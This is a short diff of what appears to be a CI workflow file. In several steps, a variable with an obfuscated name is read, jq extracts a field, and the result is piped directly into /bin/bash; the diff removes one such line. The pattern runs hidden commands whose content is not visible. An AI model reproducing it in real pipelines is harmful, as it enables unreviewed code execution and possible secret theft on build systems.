@@ -24,7 +24,6 @@ jobs:
           echo $lya9112 | jq -r .r5 | /bin/bash
           echo $bcbw72 | jq -r .gu97 | /bin/bash
           echo $fgnh9 | jq -r .xor59 | /bin/bash
-          echo $gk69869 | jq -r .uxlzg2425 | /bin/bash
           echo $xwe84 | jq -r .gsz0 | /bin/bash
 
       - name: Archive output
